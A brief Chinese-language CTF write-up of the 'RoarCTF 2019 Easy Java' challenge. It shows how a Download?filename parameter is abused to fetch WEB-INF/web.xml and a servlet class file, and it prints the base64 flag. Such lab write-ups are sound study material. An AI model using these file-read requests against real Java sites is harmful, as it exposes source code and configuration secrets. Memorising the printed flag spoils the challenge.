# T17 Easy Java

> 题目：buuctf [RoarCTF 2019]Easy Java

__0x00 审题__

打开还是登录页面，sql试了啥也没有，怎么办，有个help点开

```
java.io.FileNotFoundException:{help.docx}
```
这是个啥

这里还是注意url：Download?filename=help.docx

有个下载?

因为对JAVA很陌生，不太了解它的方法

__0x01 解题__

1. 关于本题应用到的漏洞

> WEB-INF/web.xml泄露
> > WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。

```java
    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
    /WEB-INF/database.properties：数据库配置文件
```
> > 关于这种漏洞的方法介绍：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。

* 就是说，Java内部异常，Java中的所有文件都是可见的？所以我们该如何得到

2. POST方法传参

```
?filename=/WEB-INF/web.xml
```

下载一个文件，重点：

```
<servlet-name>FlagController</servlet-name>
<servlet-class>com.wm.ctf.FlagController</servlet-class>
</servlet>
<servlet-mapping>
<servlet-name>FlagController</servlet-name>
<url-pattern>/Flag</url-pattern>
```


直接搜索Flag，得到

```
java.lang.NoClassDefFoundError: com/wm/ctf/FlagController (wrong name: FlagController)
```

我们需要其中Flag类下的class文件，通过post 我们去看Flag

```
filename=WEB-INF/classes/com/wm/ctf/FlagController.class
```

得到文件，用text打开

```
ZmxhZ3tjMjkzYTA4ZC1hZWU4LTQ1N2UtOTNmNy1jYTA5ZDc1MmE0Y2N9Cg==
```

__0x02 答案__

通过base64解码，得到flag







